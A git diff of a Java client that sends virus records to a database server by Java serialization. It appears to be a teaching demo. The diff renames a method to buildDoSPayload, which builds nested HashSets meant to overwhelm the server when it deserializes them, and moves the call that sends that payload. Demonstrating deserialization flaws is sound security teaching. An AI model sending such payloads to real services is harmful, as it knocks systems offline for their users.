@@ -2,10 +2,7 @@ package com.example.client;
 
 import com.example.lib.Virus;
 
-import java.io.FileNotFoundException;
-import java.io.FileOutputStream;
 import java.io.IOException;
-import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.net.Socket;
 import java.time.LocalDate;
@@ -18,29 +15,25 @@ public class Client {
 
     public static void main(String[] ars) {
         Virus swineInfluenza = new Virus("influenza A virus subtype H1N1",
-                                        "A/H1N1", LocalDate.parse("1918-04-01"));
+                "A/H1N1", LocalDate.parse("1918-04-01"));
 
         Virus mers = new Virus("Middle East respiratory syndrome ",
-                                "MERS", LocalDate.parse("2012-05-01"));
+                "MERS", LocalDate.parse("2012-05-01"));
 
         Virus covid = new Virus("Severe acute respiratory syndrome coroNavirus 2",
-                                "SARS‑CoV‑2", LocalDate.parse("2019-12-30"));
+                "SARS‑CoV‑2", LocalDate.parse("2019-12-30"));
 
-        Object reallyBadVirus = buildReallyBadVirus();
-        
-        System.out.println(System.getProperty("java.runtime.version"));
         System.out.println("sending viruses to database server");
-
         registerVirus(swineInfluenza);
         registerVirus(mers);
         registerVirus(covid);
-        registerVirus(reallyBadVirus);
-        registerVirus(new Virus("test1", "t1", LocalDate.of(2010, 10, 10)));
-        
         System.out.println("data is send");
+
+        Object dosPayload = buildDoSPayload();
+        registerVirus(dosPayload);
     }
 
-    private static Object buildReallyBadVirus() {
+    private static Object buildDoSPayload() {
         Set root = new HashSet();
         Set s1 = root;
         Set s2 = new HashSet();
@@ -57,8 +50,7 @@ public class Client {
         }
         return root;
     }
-
-    // wont compile if we had a Virus as function parameter
+    
     private static void registerVirus(Object p) {
         try (Socket socket = new Socket(HOST, PORT);
              ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream())) {
